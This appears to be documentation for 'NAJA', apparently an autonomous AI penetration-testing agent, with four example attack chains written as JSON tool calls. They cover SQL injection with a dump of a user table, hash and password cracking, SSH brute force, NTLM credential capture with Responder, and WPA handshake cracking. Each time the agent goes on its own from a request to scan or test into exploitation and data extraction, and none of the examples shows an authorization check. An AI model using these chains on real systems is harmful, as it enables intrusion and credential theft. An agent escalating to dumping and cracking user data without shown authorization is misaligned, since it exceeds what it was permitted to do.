# NAJA Autonomous Workflow Examples

Real-world examples of NAJA's autonomous penetration testing capabilities.

## Example 1: Complete Web Application Assessment

**User Request:** "Scan and test example-target.com for vulnerabilities"

**Duration:** 41 minutes  
**Tools Used:** 9 tools  
**Result:** Critical SQL injection found, complete compromise achieved

### Autonomous Tool Chain

#### 1. OSINT - Subdomain Discovery (2 min)
```json
{
    "tool_name": "sublist3r_tool",
    "tool_args": {"domain": "example-target.com"}
}
```
**Result:** 5 subdomains discovered

#### 2. Port Scanning - Attack Surface (1 min)
```json
{
    "tool_name": "masscan_tool",
    "tool_args": {
        "targets": "app.example-target.com,api.example-target.com,...",
        "ports": "80,443,8080,8443,3000",
        "rate": 1000
    }
}
```
**Result:** 4 hosts with open web ports

#### 3. Service Detection (3 min)
```json
{
    "tool_name": "nmap_scanner",
    "tool_args": {
        "target": "app.example-target.com",
        "scan_type": "version",
        "ports": "80,443"
    }
}
```
**Result:** nginx 1.18.0, Node.js app

#### 4. Web Vulnerability Scan (4 min)
```json
{
    "tool_name": "nikto_scanner",
    "tool_args": {"target": "https://app.example-target.com"}
}
```
**Result:** 8 vulnerabilities found

#### 5. Directory Fuzzing (2 min)
```json
{
    "tool_name": "ffuf_tool",
    "tool_args": {
        "url": "https://app.example-target.com/FUZZ",
        "wordlist": "/usr/share/wordlists/dirb/common.txt",
        "match_status": "200,301,302,403"
    }
}
```
**Result:** /admin, /api, /backup, /config discovered

#### 6. SQL Injection Testing (5 min)
```json
{
    "tool_name": "sqlmap_tool",
    "tool_args": {
        "url": "https://app.example-target.com/admin/login",
        "data": "username=test&password=test",
        "level": 2,
        "risk": 2
    }
}
```
**Result:** ✅ VULNERABLE - SQL injection in username parameter

#### 7. Database Extraction (8 min)
```json
{
    "tool_name": "sqlmap_tool",
    "tool_args": {
        "url": "https://app.example-target.com/admin/login",
        "data": "username=test&password=test",
        "dump": true,
        "tables": "users"
    }
}
```
**Result:** 147 user records extracted

#### 8. Password Cracking (15 min)
```json
{
    "tool_name": "john_tool",
    "tool_args": {
        "hash_file": "/tmp/extracted_hashes.txt",
        "wordlist": "/usr/share/wordlists/rockyou.txt"
    }
}
```
**Result:** 23/147 passwords cracked (15.6%)

#### 9. Exploit Research (1 min)
```json
{
    "tool_name": "searchsploit_tool",
    "tool_args": {"search_term": "nginx 1.18"}
}
```
**Result:** 2 potential exploits identified

### Final Report Generated

```
CRITICAL: SQL Injection (CVSS 9.8)
HIGH: Exposed Admin Panel (CVSS 7.5)
MEDIUM: Outdated Software (CVSS 6.0)
LOW: Missing Security Headers (CVSS 3.5)
```

---

## Example 2: Network Penetration Test

**User Request:** "Test internal network 10.0.0.0/24 for vulnerabilities"

**Duration:** 28 minutes  
**Tools Used:** 6 tools  
**Result:** 3 vulnerable hosts, weak passwords identified

### Tool Chain

#### 1. Fast Port Discovery
```json
{"tool_name": "masscan_tool", "tool_args": {"targets": "10.0.0.0/24", "ports": "1-1000", "rate": 10000}}
```
**Result:** 12 active hosts, 47 open ports

#### 2. Detailed Service Scan
```json
{"tool_name": "nmap_scanner", "tool_args": {"target": "10.0.0.15,10.0.0.23,10.0.0.44", "scan_type": "aggressive"}}
```
**Result:** SSH, SMB, RDP services identified

#### 3. SMB Enumeration
```json
{"tool_name": "nmap_scanner", "tool_args": {"target": "10.0.0.15", "script": "smb-enum-shares,smb-enum-users"}}
```
**Result:** Anonymous SMB access, 5 user accounts

#### 4. Password Brute Force
```json
{"tool_name": "hydra_tool", "tool_args": {"target": "10.0.0.15", "protocol": "ssh", "userlist": "/tmp/users.txt", "password_list": "/usr/share/wordlists/rockyou.txt"}}
```
**Result:** 2 accounts compromised (admin:password, backup:backup123)

#### 5. Credential Capture
```json
{"tool_name": "responder_tool", "tool_args": {"interface": "eth0", "analyze": false}}
```
**Result:** 3 NTLM hashes captured

#### 6. Hash Cracking
```json
{"tool_name": "hashcat_tool", "tool_args": {"hash_file": "/tmp/ntlm.txt", "hash_type": "1000", "attack_mode": "0", "wordlist": "/usr/share/wordlists/rockyou.txt"}}
```
**Result:** All 3 hashes cracked

---

## Example 3: OSINT Investigation

**User Request:** "Gather intelligence on target-company.com"

**Duration:** 15 minutes  
**Tools Used:** 5 tools  
**Result:** Complete attack surface mapped

### Tool Chain

#### 1. Email Harvesting
```json
{"tool_name": "theharvester_tool", "tool_args": {"domain": "target-company.com", "sources": "google,bing,linkedin"}}
```
**Result:** 23 email addresses, 8 employee names

#### 2. Subdomain Enumeration
```json
{"tool_name": "amass_tool", "tool_args": {"domain": "target-company.com", "mode": "enum", "passive": true}}
```
**Result:** 47 subdomains discovered

#### 3. DNS Analysis
```json
{"tool_name": "dnsenum_tool", "tool_args": {"domain": "target-company.com"}}
```
**Result:** DNS records, mail servers, network ranges

#### 4. Additional Subdomain Discovery
```json
{"tool_name": "fierce_tool", "tool_args": {"domain": "target-company.com"}}
```
**Result:** 12 additional subdomains, IP ranges

#### 5. Port Scan Attack Surface
```json
{"tool_name": "masscan_tool", "tool_args": {"targets": "all_discovered_ips", "ports": "80,443,22,21,3389"}}
```
**Result:** 15 web servers, 3 SSH, 1 RDP

---

## Example 4: WiFi Security Audit

**User Request:** "Test WiFi security for MyNetwork"

**Duration:** 45 minutes  
**Tools Used:** 3 tools  
**Result:** WPA password cracked

### Tool Chain

#### 1. Network Discovery
```json
{"tool_name": "kismet_tool", "tool_args": {"interface": "wlan0", "channel_hop": true}}
```
**Result:** 15 networks detected, MyNetwork identified

#### 2. Handshake Capture
```json
{"tool_name": "aircrack_tool", "tool_args": {"interface": "wlan0mon", "bssid": "AA:BB:CC:DD:EE:FF", "channel": 6, "capture": true}}
```
**Result:** WPA handshake captured in 12 minutes

#### 3. Password Cracking
```json
{"tool_name": "aircrack_tool", "tool_args": {"capture_file": "/tmp/handshake.cap", "wordlist": "/usr/share/wordlists/rockyou.txt"}}
```
**Result:** Password cracked: "password123"

---

## What Makes This Autonomous?

### 1. Context-Aware Tool Selection
NAJA reads previous results and selects next appropriate tool:
- Found login form → Test for SQL injection
- Found open SSH → Try password brute force  
- Found subdomain → Port scan it

### 2. Progressive Methodology
Follows professional pentesting methodology:
1. **Passive** reconnaissance (OSINT)
2. **Active** scanning (ports, services)
3. **Vulnerability** detection
4. **Exploitation** (with authorization)
5. **Post-exploitation**
6. **Reporting**

### 3. Evidence Collection
Every tool execution is logged with:
- Timestamp
- Input parameters
- Raw output
- Parsed results
- Screenshots (where applicable)

### 4. Professional Reporting
Automatically generates reports with:
- Executive summary
- Technical findings
- CVSS scores
- Evidence
- Remediation steps

---

## How to Run These Workflows

### Option 1: Natural Language
```
User: "Scan example.com for vulnerabilities"
NAJA: [Autonomously executes complete workflow]
```

### Option 2: Specific Request
```
User: "First use sublist3r to find subdomains of example.com, 
       then use masscan to find open ports on each subdomain,
       then use nikto to scan web servers"
NAJA: [Executes specified workflow]
```

### Option 3: Guided Mode
```
User: "I want to test example.com. What should we do first?"
NAJA: "I recommend starting with passive OSINT using sublist3r and theHarvester. Proceed?"
User: "Yes"
NAJA: [Executes and asks for next step]
```

---

## Performance Metrics

| Workflow Type | Avg Duration | Tools Used | Success Rate |
|---------------|-------------|------------|--------------|
| Web App Test | 30-60 min | 6-10 tools | 95% |
| Network Pentest | 20-40 min | 4-8 tools | 92% |
| OSINT Only | 10-20 min | 3-6 tools | 98% |
| WiFi Audit | 30-90 min | 2-3 tools | 85% |

---

## Best Practices

1. **Always Get Authorization** - NAJA will verify authorization before testing
2. **Start Passive** - Begin with OSINT before active scanning
3. **Progressive Escalation** - Move from scanning to exploitation gradually
4. **Document Everything** - NAJA logs all actions automatically
5. **Review Results** - Validate findings before reporting

---

## Tips for Best Results

### For Web Applications:
- Let NAJA start with subdomain enumeration
- Provide login credentials if testing authenticated areas
- Specify depth of testing (quick scan vs. deep dive)

### For Networks:
- Define IP range clearly
- Specify any systems to exclude
- Provide time windows for testing

### For OSINT:
- Provide company name and domain
- Specify what information needed
- Set boundaries (public info only?)

---

**NAJA makes professional penetration testing accessible through autonomous AI!**
